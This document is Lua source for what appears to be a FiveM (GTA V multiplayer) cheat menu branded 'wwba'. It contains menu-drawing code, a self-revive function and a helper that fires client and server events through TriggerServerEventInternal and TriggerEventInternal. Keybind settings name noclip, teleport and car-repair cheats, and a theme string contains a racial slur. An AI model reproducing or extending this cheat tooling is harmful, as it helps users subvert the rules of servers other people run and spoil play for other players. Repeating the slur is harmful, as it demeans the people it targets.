IhadSexWithMyStepMother = {}
IhadSexWithMyStepMother.debug = true
local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 202}
local optionCount = 0
local currentKey = nil
local currentMenu = nil
local titleHeight = 0.11
local titleXOffset = 0.5
local titleSpacing = 2
local titleYOffset = 0.03
local titleScale = 1.0
local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005
local function debugPrint(text)
    if IhadSexWithMyStepMother.debug then
        Citizen.Trace("[IhadSexWithMyStepMother] " .. tostring(text))
    end
end

    function ReviveKubca()
        local entcord = GetEntityCoords(PlayerPedId())
        local cords = {
            x = math.round(entcord.x, 1),
            y = math.round(entcord.y, 1),
            z = math.round(entcord.z, 1)
        }
        respawnPed(PlayerPedId(), cords, 0)
        StopScreenEffect("DeathFailOut")
    end

    function respawnPed(id, cords, int)
        SetEntityCoordsNoOffset(id, cords.x, cords.y, cords.z, false, false, false, true)
        NetworkResurrectLocalPlayer(cords.x, cords.y, cords.z, int, true, false)
        SetPlayerInvincible(id, false)
        TSE(false, "playerSpawned", cords.x, cords.y, cords.z)
        ClearPedBloodDamage(id)
    end

    function TSE(is_server,event,...)
        local args=msgpack.pack({...})
        if is_server then
            TriggerServerEventInternal(event,args,args:len())
        else
            TriggerEventInternal(event,args,args:len())
        end
    end

    function math.round(first, second)
        return tonumber(string.format("%." .. (second or 0) .. "f", first))
    end

local function setMenuProperty(id, property, value)
    if id and menus[id] then
        menus[id][property] = value
        debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
    end
end
local function isMenuVisible(id)
    if id and menus[id] then
        return menus[id].visible
    else
        return false
    end
end
local function setMenuVisible(id, visible, holdCurrent)
    if id and menus[id] then
        setMenuProperty(id, "visible", visible)
        if not holdCurrent and menus[id] then
            setMenuProperty(id, "currentOption", 1)
        end
        if visible then
            if id ~= currentMenu and isMenuVisible(currentMenu) then
                setMenuVisible(currentMenu, false)
            end
            currentMenu = id
        end
    end
end
local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale)
    if shadow then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end
    if menus[currentMenu] then
        if center then
            SetTextCentre(center)
        elseif alignRight then
            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
            SetTextRightJustify(true)
        end
    end
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x, y)
end
local function drawRect(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end
local function drawTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset
        local y = menus[currentMenu].y + titleHeight * 1 / titleSpacing
        if menus[currentMenu].titleBackgroundSprite then
            DrawSprite(
                menus[currentMenu].titleBackgroundSprite.dict,
                menus[currentMenu].titleBackgroundSprite.name,
                x,
                y,
                menus[currentMenu].width,
                titleHeight,
                0.,
                255,
                255,
                255,
                255
            )
        else
            drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
        end
        drawText(
            menus[currentMenu].title,
            xText,
            y - titleHeight / 2 + titleYOffset,
            menus[currentMenu].titleFont,
            menus[currentMenu].titleColor,
            titleScale,
            true
        )
    end
end
local txtRatio = {}
local function DrawSpriteScaled(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
	-- calculate the height of a sprite using aspect ratio and hash it in memory
    local ratio = GetAspectRatio(true)
    local index = tostring(textureName)
    local mult = 10^3
    local floor = math.floor
	
	if not txtRatio[index] then
		txtRatio[index] = {}
		local res = GetTextureResolution(textureDict, textureName)
		
		txtRatio[index].ratio = (res[2] / res[1])
		txtRatio[index].height = floor(((width * txtRatio[index].ratio) * ratio) * mult + 0.5) / mult
		DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
	end
	
	DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menus[currentMenu].width / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
        local separatorHeight = 0.0025
        local frameWidth = 0.004
        local menuWidth = 0.20
        local sliderWidth = (menuWidth / 4)

                local subTitleColor = {
            r = menus[currentMenu].titleBackgroundColor.r,
            g = menus[currentMenu].titleBackgroundColor.g,
            b = menus[currentMenu].titleBackgroundColor.b,
            a = 255
        }
        drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)

        drawText(
            menus[currentMenu].subTitle,
            menus[currentMenu].x + buttonTextXOffset,
            y - buttonHeight / 2 + buttonTextYOffset,
            buttonFont,
            subTitleColor,
            buttonScale,
            false
        )
		AddReplaceTexture("shopui_title_graphics_franklin", "shopui_title_graphics_franklin", "meows", "woof")


		DrawSprite("meows", "woof", x, y -0.025, menus[currentMenu].width, buttonHeight +0.05, 0, 255, 255, 255, 255)        

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menus[currentMenu].width,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local txd = CreateRuntimeTxd('meows') 
local duiObj = CreateDui("https://cdn.discordapp.com/attachments/940685677840961659/983811730587136010/wwba_on_top.png", 500, 240)
local dui = GetDuiHandle(duiObj)
local txn = CreateRuntimeTextureFromDuiHandle(txd, "wwba", dui)

local function drawButton(text, subText)
    local x = menus[currentMenu].x + menus[currentMenu].width / 2
    local multiplier = nil
    if
        menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
            optionCount <= menus[currentMenu].maxOptionCount
     then
        multiplier = optionCount
    elseif
        optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
            optionCount <= menus[currentMenu].currentOption
     then
        multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end
    if multiplier then
        local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
        local backgroundColor = nil
        local textColor = nil
        local subTextColor = nil
        local shadow = false
        if menus[currentMenu].currentOption == optionCount then
            backgroundColor = menus[currentMenu].menuFocusBackgroundColor
            textColor = menus[currentMenu].menuFocusTextColor
            subTextColor = menus[currentMenu].menuFocusTextColor
        else
            backgroundColor = menus[currentMenu].menuBackgroundColor
            textColor = menus[currentMenu].menuTextColor
            subTextColor = menus[currentMenu].menuSubTextColor
            shadow = true
        end
        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
        drawText(
            text,
            menus[currentMenu].x + buttonTextXOffset,
            y - (buttonHeight / 2) + buttonTextYOffset,
            buttonFont,
            textColor,
            buttonScale,
            false,
            shadow
        )
        if subText then
            drawText(
                subText,
                menus[currentMenu].x + buttonTextXOffset,
                y - buttonHeight / 2 + buttonTextYOffset,
                buttonFont,
                subTextColor,
                buttonScale,
                false,
                shadow,
                true
            )
        end
    end
end
function IhadSexWithMyStepMother.CreateMenu(id, title)
    menus[id] = {}
    menus[id].title = title
    menus[id].subTitle = "INTERACTION MENU"
    menus[id].visible = false
    menus[id].previousMenu = nil
    menus[id].aboutToBeClosed = false
    menus[id].x = 0.0175
    menus[id].y = 0.025
    menus[id].width = 0.23
    menus[id].currentOption = 1
    menus[id].maxOptionCount = 10
    menus[id].titleFont = 0
    menus[id].titleColor = {r = 0, g = 0, b = 0, a = 255}
    menus[id].titleBackgroundColor = {r = 0, g = 127, b = 23, a = 255}
    menus[id].titleBackgroundSprite = nil
    menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
    menus[id].menuSubTextColor = {r = 255, g = 255, b = 255, a = 255}
    menus[id].menuFocusTextColor = {r = 0, g = 0, b = 0, a = 255}
    menus[id].menuFocusBackgroundColor = {r = 255, g = 255, b = 255, a = 255}
    menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 160}
    menus[id].subTitleBackgroundColor = {
        r = menus[id].menuBackgroundColor.r,
        g = menus[id].menuBackgroundColor.g,
        b = menus[id].menuBackgroundColor.b,
        a = 255
    }
    menus[id].buttonPressedSound = {name = "wwba", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}
    debugPrint(tostring(id) .. " menu created")
end
function IhadSexWithMyStepMother.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        IhadSexWithMyStepMother.CreateMenu(id, menus[parent].title)
        if subTitle then
            setMenuProperty(id, "subTitle", string.upper(subTitle))
        else
            setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
        end
        setMenuProperty(id, "previousMenu", parent)
        setMenuProperty(id, "x", menus[parent].x)
        setMenuProperty(id, "y", menus[parent].y)
        setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
        setMenuProperty(id, "titleFont", menus[parent].titleFont)
        setMenuProperty(id, "titleColor", menus[parent].titleColor)
        setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
        setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
        setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
        setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
        setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
        setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
        setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
        setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
    else
        debugPrint(
            "Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist"
        )
    end
end
function IhadSexWithMyStepMother.CurrentMenu()
    return currentMenu
end
function IhadSexWithMyStepMother.OpenMenu(id)
    if id and menus[id] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        setMenuVisible(id, true)
        debugPrint(tostring(id) .. " menu opened")
    else
        debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
    end
end
function IhadSexWithMyStepMother.IsMenuOpened(id)
    return isMenuVisible(id)
end
function IhadSexWithMyStepMother.IsAnyMenuOpened()
    for id, _ in pairs(menus) do
        if isMenuVisible(id) then
            return true
        end
    end
    return false
end
function IhadSexWithMyStepMother.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
        return menus[currentMenu].aboutToBeClosed
    else
        return false
    end
end
function IhadSexWithMyStepMother.CloseMenu()
    if menus[currentMenu] then
        if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = false
            setMenuVisible(currentMenu, false)
            debugPrint(tostring(currentMenu) .. " menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            currentMenu = nil
            currentKey = nil
        else
            menus[currentMenu].aboutToBeClosed = true
            debugPrint(tostring(currentMenu) .. " menu about to be closed")
        end
    end
end
function IhadSexWithMyStepMother.Button(text, subText)
    local buttonText = text
    if subText then
        buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
    end
    if menus[currentMenu] then
        optionCount = optionCount + 1
        local isCurrent = menus[currentMenu].currentOption == optionCount
        drawButton(text, subText)
        if isCurrent then
            if currentKey == keys.select then
                PlaySoundFrontend(
                    -1,
                    menus[currentMenu].buttonPressedSound.name,
                    menus[currentMenu].buttonPressedSound.set,
                    true
                )
                debugPrint(buttonText .. " button pressed")
                return true
            elseif currentKey == keys.left or currentKey == keys.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end
        return false
    else
        debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")
        return false
    end
end
function IhadSexWithMyStepMother.MenuButton(text, id)
    if menus[id] then
        if IhadSexWithMyStepMother.Button(text .. themecolor .. "" .. themearrow) then
            setMenuVisible(currentMenu, false)
            setMenuVisible(id, true, true)
            return true
        end
    else
        debugPrint(
            "Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist"
        )
    end
    return false
end
function IhadSexWithMyStepMother.CheckBox(text, checked, offtext, ontext, callback)
    if not offtext then
        offtext = "Off"
    end
    if not ontext then
        ontext = "On"
    end
    if IhadSexWithMyStepMother.Button(text, checked and ontext or offtext) then
        checked = not checked
        debugPrint(tostring(text) .. " checkbox changed to " .. tostring(checked))
        if callback then
            callback(checked)
        end
        return true
    end
    return false
end
function IhadSexWithMyStepMother.ComboBox(text, items, currentIndex, selectedIndex, callback)
    local itemsCount = #items
    local selectedItem = items[currentIndex]
    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
    if itemsCount > 1 and isCurrent then
        selectedItem = tostring(selectedItem)
    end
    if IhadSexWithMyStepMother.Button(text, selectedItem) then
        selectedIndex = currentIndex
        callback(currentIndex, selectedIndex)
        return true
    elseif isCurrent then
        if currentKey == keys.left then
            if currentIndex > 1 then
                currentIndex = currentIndex - 1
            else
                currentIndex = itemsCount
            end
        elseif currentKey == keys.right then
            if currentIndex < itemsCount then
                currentIndex = currentIndex + 1
            else
                currentIndex = 1
            end
        end
    else
        currentIndex = selectedIndex
    end
    callback(currentIndex, selectedIndex)
    return false
end
function IhadSexWithMyStepMother.Display()
    if isMenuVisible(currentMenu) then
        if menus[currentMenu].aboutToBeClosed then
            IhadSexWithMyStepMother.CloseMenu()
        else
            ClearAllHelpMessages()
            drawTitle()
            drawSubTitle()
            currentKey = nil
            if IsDisabledControlJustReleased(1, keys.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if menus[currentMenu].currentOption < optionCount then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                else
                    menus[currentMenu].currentOption = 1
                end
            elseif IsDisabledControlJustReleased(1, keys.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if menus[currentMenu].currentOption > 1 then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
                else
                    menus[currentMenu].currentOption = optionCount
                end
            elseif IsDisabledControlJustReleased(1, keys.left) then
                currentKey = keys.left
            elseif IsDisabledControlJustReleased(1, keys.right) then
                currentKey = keys.right
            elseif IsDisabledControlJustReleased(1, keys.select) then
                currentKey = keys.select
            elseif IsDisabledControlJustReleased(1, keys.back) then
                if menus[menus[currentMenu].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    setMenuVisible(menus[currentMenu].previousMenu, true)
                else
                    IhadSexWithMyStepMother.CloseMenu()
                end
            end
            optionCount = 0
        end
    end
end
function IhadSexWithMyStepMother.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end
function IhadSexWithMyStepMother.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end
function IhadSexWithMyStepMother.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end
function IhadSexWithMyStepMother.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end
function IhadSexWithMyStepMother.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end
function IhadSexWithMyStepMother.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end
function IhadSexWithMyStepMother.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(
        id,
        "titleBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
    )
end
function IhadSexWithMyStepMother.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end
function IhadSexWithMyStepMother.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end
function IhadSexWithMyStepMother.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(
        id,
        "menuBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
    )
end
function IhadSexWithMyStepMother.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end
function IhadSexWithMyStepMother.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(
        id,
        "menuSubTextColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a}
    )
end
function IhadSexWithMyStepMother.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end
function IhadSexWithMyStepMother.SetMenuButtonPressedSound(id, name, set)
    setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end
Tools = {}
local IDGenerator = {}
function Tools.newIDGenerator()
    local r = setmetatable({}, {__index = IDGenerator})
    r:construct()
    return r
end
function IDGenerator:construct()
    self:clear()
end
function IDGenerator:clear()
    self.max = 0
    self.ids = {}
end
function IDGenerator:gen()
    if #self.ids > 0 then
        return table.remove(self.ids)
    else
        local r = self.max
        self.max = self.max + 1
        return r
    end
end
function IDGenerator:free(id)
    table.insert(self.ids, id)
end
Tunnel = {}
local function tunnel_resolve(itable, key)
    local mtable = getmetatable(itable)
    local iname = mtable.name
    local ids = mtable.tunnel_ids
    local callbacks = mtable.tunnel_callbacks
    local identifier = mtable.identifier
    local fcall = function(args, callback)
        if args == nil then
            args = {}
        end
        if type(callback) == "function" then
            local rid = ids:gen()
            callbacks[rid] = callback
            TriggerServerEvent(iname .. ":tunnel_req", key, args, identifier, rid)
        else
            TriggerServerEvent(iname .. ":tunnel_req", key, args, "", -1)
        end
    end
    itable[key] = fcall
    return fcall
end
function Tunnel.bindInterface(name, interface)
    RegisterNetEvent(name .. ":tunnel_req")
    AddEventHandler(
        name .. ":tunnel_req",
        function(member, args, identifier, rid)
            local f = interface[member]
            local delayed = false
            local rets = {}
            if type(f) == "function" then
                TUNNEL_DELAYED = function()
                    delayed = true
                    return function(rets)
                        rets = rets or {}
                        if rid >= 0 then
                            TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
                        end
                    end
                end
                rets = {f(table.unpack(args))}
            end
            if not delayed and rid >= 0 then
                TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
            end
        end
    )
end
function Tunnel.getInterface(name, identifier)
    local ids = Tools.newIDGenerator()
    local callbacks = {}
    local r =
        setmetatable(
        {},
        {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier}
    )
    RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")
    AddEventHandler(
        name .. ":" .. identifier .. ":tunnel_res",
        function(rid, args)
            local callback = callbacks[rid]
            if callback ~= nil then
                ids:free(rid)
                callbacks[rid] = nil
                callback(table.unpack(args))
            end
        end
    )
    return r
end
Proxy = {}
local proxy_rdata = {}
local function proxy_callback(rvalues)
    proxy_rdata = rvalues
end
local function proxy_resolve(itable, key)
    local iname = getmetatable(itable).name
    local fcall = function(args, callback)
        if args == nil then
            args = {}
        end
        TriggerEvent(iname .. ":proxy", key, args, proxy_callback)
        return table.unpack(proxy_rdata)
    end
    itable[key] = fcall
    return fcall
end
function Proxy.addInterface(name, itable)
    AddEventHandler(
        name .. ":proxy",
        function(member, args, callback)
            local f = itable[member]
            if type(f) == "function" then
                callback({f(table.unpack(args))})
            else
            end
        end
    )
end
function Proxy.getInterface(name)
    local r = setmetatable({}, {__index = proxy_resolve, name = name})
    return r
end


local developers = {
    {"~wwba#", "~b~Discord"},
    {"wwba", "~g~Developers"},
    {'<font color="#E400FF">~y~wwba on top', '~w~<font color="#2580E1">Friend~w~, </font> <font color="#4280C6">UI ~w~& ~y~Help</font>'},
    {"wwba", "discord.gg/wwba"},
}

version = "~s~ 1~r~.0" 
theme = "StupidNiggaPaster"
themes = {"StupidNiggaPaster"}
mpMessage = false
menuKeybind = "F10"	
menuKeybind2 = "L"	
noclipKeybind = "N7"		
teleportKeyblind = "N4"
fixvaiculoKeyblind = "N6"
startMessage = "~g~BY : ~r~wwba"	
subMessage = "~r~wwba"
subMessage1 = "~b~DISCORD : discord.gg/wwba"
motd2 = "Key ~r~*" ..teleportKeyblind.."* ~w~TeleportToWaypoint"
motd = "Key ~r~*" ..noclipKeybind.."* ~w~Active noclip!"
motd5 = "Key ~r~*" ..fixvaiculoKeyblind.."* ~w~Fix Car" 
motd3 = "~v~wwba STORE ON TOP"


local texture_preload = {
    "shopui_title_graphics_franklin",
    "mparrow",
}

local function PreloadTextures()
	
	--debugprint("^7Preloading texture dictionaries...")
	for i = 1, #texture_preload do
		RequestStreamedTextureDict(texture_preload[i])
	end

end

PreloadTextures()

FiveM = {}
do
    FiveM.Notify = function(text, type)
        if type == nil then type = NotificationType.None end
        SetNotificationTextEntry("STRING")
        if type == NotificationType.Info then
            AddTextComponentString("~b~~h~Info~h~~s~: " .. text)
        elseif type == NotificationType.Error then
            AddTextComponentString("~r~~h~Error~h~~s~: " .. text)
        elseif type == NotificationType.Alert then
            AddTextComponentString("~y~~h~Alert~h~~s~: " .. text)
        elseif type == NotificationType.Success then
            AddTextComponentString("~g~~h~Success~h~~s~: " .. text)
        else
            AddTextComponentString(text)
        end
        DrawNotification(false, false)
    end

    FiveM.Subtitle = function(message, duration, drawImmediately)
        if duration == nil then duration = 2500 end;
        if drawImmediately == nil then drawImmediately = true; end;
        ClearPrints()
        SetTextEntry_2("STRING");
        for i = 1, message:len(), 99 do
            AddTextComponentString(string.sub(message, i, i + 99))
        end
        DrawSubtitleTimed(duration, drawImmediately);
    end

    FiveM.GetKeyboardInput = function(TextEntry, ExampleText, MaxStringLength)
        AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        local blockinput = true
        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do Citizen.Wait(0) end

        if UpdateOnscreenKeyboard() ~= 2 then
            local result = GetOnscreenKeyboardResult()
            Citizen.Wait(500)
            blockinput = false
            return result
        else
            Citizen.Wait(500)
            blockinput = false
            return nil
        end
    end

    FiveM.GetVehicleProperties = function(vehicle)
        local color1, color2 = GetVehicleColours(vehicle)
        local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
        local extras = {}

        for id = 0, 12 do
            if DoesExtraExist(vehicle, id) then
                local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
                extras[tostring(id)] = state
            end
        end

        return {
            model = GetEntityModel(vehicle),

            plate = math.trim(GetVehicleNumberPlateText(vehicle)),
            plateIndex = GetVehicleNumberPlateTextIndex(vehicle),

            health = GetEntityMaxHealth(vehicle),
            dirtLevel = GetVehicleDirtLevel(vehicle),

            color1 = color1,
            color2 = color2,

            pearlescentColor = pearlescentColor,
            wheelColor = wheelColor,

            wheels = GetVehicleWheelType(vehicle),
            windowTint = GetVehicleWindowTint(vehicle),

            neonEnabled = {
                IsVehicleNeonLightEnabled(vehicle, 0), IsVehicleNeonLightEnabled(vehicle, 1), IsVehicleNeonLightEnabled(vehicle, 2),
                IsVehicleNeonLightEnabled(vehicle, 3)
            },

            extras = extras,

            neonColor = table.pack(GetVehicleNeonLightsColour(vehicle)),
            tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(vehicle)),

            modSpoilers = GetVehicleMod(vehicle, 0),
            modFrontBumper = GetVehicleMod(vehicle, 1),
            modRearBumper = GetVehicleMod(vehicle, 2),
            modSideSkirt = GetVehicleMod(vehicle, 3),
            modExhaust = GetVehicleMod(vehicle, 4),
            modFrame = GetVehicleMod(vehicle, 5),
            modGrille = GetVehicleMod(vehicle, 6),
            modHood = GetVehicleMod(vehicle, 7),
            modFender = GetVehicleMod(vehicle, 8),
            modRightFender = GetVehicleMod(vehicle, 9),
            modRoof = GetVehicleMod(vehicle, 10),

            modEngine = GetVehicleMod(vehicle, 11),
            modBrakes = GetVehicleMod(vehicle, 12),
            modTransmission = GetVehicleMod(vehicle, 13),
            modHorns = GetVehicleMod(vehicle, 14),
            modSuspension = GetVehicleMod(vehicle, 15),
            modArmor = GetVehicleMod(vehicle, 16),

            modTurbo = IsToggleModOn(vehicle, 18),
            modSmokeEnabled = IsToggleModOn(vehicle, 20),
            modXenon = IsToggleModOn(vehicle, 22),

            modFrontWheels = GetVehicleMod(vehicle, 23),
            modBackWheels = GetVehicleMod(vehicle, 24),

            modPlateHolder = GetVehicleMod(vehicle, 25),
            modVanityPlate = GetVehicleMod(vehicle, 26),
            modTrimA = GetVehicleMod(vehicle, 27),
            modOrnaments = GetVehicleMod(vehicle, 28),
            modDashboard = GetVehicleMod(vehicle, 29),
            modDial = GetVehicleMod(vehicle, 30),
            modDoorSpeaker = GetVehicleMod(vehicle, 31),
            modSeats = GetVehicleMod(vehicle, 32),
            modSteeringWheel = GetVehicleMod(vehicle, 33),
            modShifterLeavers = GetVehicleMod(vehicle, 34),
            modAPlate = GetVehicleMod(vehicle, 35),
            modSpeakers = GetVehicleMod(vehicle, 36),
            modTrunk = GetVehicleMod(vehicle, 37),
            modHydrolic = GetVehicleMod(vehicle, 38),
            modEngineBlock = GetVehicleMod(vehicle, 39),
            modAirFilter = GetVehicleMod(vehicle, 40),
            modStruts = GetVehicleMod(vehicle, 41),
            modArchCover = GetVehicleMod(vehicle, 42),
            modAerials = GetVehicleMod(vehicle, 43),
            modTrimB = GetVehicleMod(vehicle, 44),
            modTank = GetVehicleMod(vehicle, 45),
            modWindows = GetVehicleMod(vehicle, 46),
            modLivery = GetVehicleLivery(vehicle)
        }
    end

    FiveM.SetVehicleProperties = function(vehicle, props)
        SetVehicleModKit(vehicle, 0)

        if props.plate ~= nil then SetVehicleNumberPlateText(vehicle, props.plate) end

        if props.plateIndex ~= nil then SetVehicleNumberPlateTextIndex(vehicle, props.plateIndex) end

        if props.health ~= nil then SetEntityHealth(vehicle, props.health) end

        if props.dirtLevel ~= nil then SetVehicleDirtLevel(vehicle, props.dirtLevel) end

        if props.color1 ~= nil then
            local color1, color2 = GetVehicleColours(vehicle)
            SetVehicleColours(vehicle, props.color1, color2)
        end

        if props.color2 ~= nil then
            local color1, color2 = GetVehicleColours(vehicle)
            SetVehicleColours(vehicle, color1, props.color2)
        end

        if props.pearlescentColor ~= nil then
            local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
            SetVehicleExtraColours(vehicle, props.pearlescentColor, wheelColor)
        end

        if props.wheelColor ~= nil then
            local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
            SetVehicleExtraColours(vehicle, pearlescentColor, props.wheelColor)
        end

        if props.wheels ~= nil then SetVehicleWheelType(vehicle, props.wheels) end

        if props.windowTint ~= nil then SetVehicleWindowTint(vehicle, props.windowTint) end

        if props.neonEnabled ~= nil then
            SetVehicleNeonLightEnabled(vehicle, 0, props.neonEnabled[1])
            SetVehicleNeonLightEnabled(vehicle, 1, props.neonEnabled[2])
            SetVehicleNeonLightEnabled(vehicle, 2, props.neonEnabled[3])
            SetVehicleNeonLightEnabled(vehicle, 3, props.neonEnabled[4])
        end

        if props.extras ~= nil then
            for id, enabled in pairs(props.extras) do
                if enabled then
                    SetVehicleExtra(vehicle, tonumber(id), 0)
                else
                    SetVehicleExtra(vehicle, tonumber(id), 1)
                end
            end
        end

        if props.neonColor ~= nil then SetVehicleNeonLightsColour(vehicle, props.neonColor[1], props.neonColor[2], props.neonColor[3]) end

        if props.modSmokeEnabled ~= nil then ToggleVehicleMod(vehicle, 20, true) end

        if props.tyreSmokeColor ~= nil then
            SetVehicleTyreSmokeColor(vehicle, props.tyreSmokeColor[1], props.tyreSmokeColor[2], props.tyreSmokeColor[3])
        end

        if props.modSpoilers ~= nil then SetVehicleMod(vehicle, 0, props.modSpoilers, false) end

        if props.modFrontBumper ~= nil then SetVehicleMod(vehicle, 1, props.modFrontBumper, false) end

        if props.modRearBumper ~= nil then SetVehicleMod(vehicle, 2, props.modRearBumper, false) end

        if props.modSideSkirt ~= nil then SetVehicleMod(vehicle, 3, props.modSideSkirt, false) end

        if props.modExhaust ~= nil then SetVehicleMod(vehicle, 4, props.modExhaust, false) end

        if props.modFrame ~= nil then SetVehicleMod(vehicle, 5, props.modFrame, false) end

        if props.modGrille ~= nil then SetVehicleMod(vehicle, 6, props.modGrille, false) end

        if props.modHood ~= nil then SetVehicleMod(vehicle, 7, props.modHood, false) end

        if props.modFender ~= nil then SetVehicleMod(vehicle, 8, props.modFender, false) end

        if props.modRightFender ~= nil then SetVehicleMod(vehicle, 9, props.modRightFender, false) end

        if props.modRoof ~= nil then SetVehicleMod(vehicle, 10, props.modRoof, false) end

        if props.modEngine ~= nil then SetVehicleMod(vehicle, 11, props.modEngine, false) end

        if props.modBrakes ~= nil then SetVehicleMod(vehicle, 12, props.modBrakes, false) end

        if props.modTransmission ~= nil then SetVehicleMod(vehicle, 13, props.modTransmission, false) end

